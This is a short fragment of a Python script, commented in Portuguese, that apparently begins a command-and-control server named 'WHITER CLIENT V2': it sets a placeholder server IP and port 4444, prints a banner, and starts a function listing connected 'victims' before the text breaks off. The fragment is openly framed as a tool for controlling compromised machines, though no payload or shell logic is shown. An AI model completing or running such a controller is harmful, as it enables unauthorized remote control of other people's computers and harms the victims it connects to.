import socket
import threading

HOST = 'SEU_IP_AQUI'  # Substitua pelo IP do servidor
PORT = 4444

# Função para mostrar o banner
def banner():
    print("""
██╗    ██╗██╗  ██╗██╗████████╗███████╗██████╗     
██║    ██║██║  ██║██║╚══██╔══╝██╔════╝██╔══██╗    
██║ █╗ ██║███████║██║   ██║   █████╗  ██████╔╝    
██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██╔══██╗    
╚███╔███╔╝██║  ██║██║   ██║   ███████╗██║  ██║    
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    
     W H I T E R   C L I E N T   V2
""")

# Função para listar vítimas conectadas
def listar_vitimas(clientes):
    print("\n[ VÍTIMAS CONECTADAS ]")
    for i, (conn,
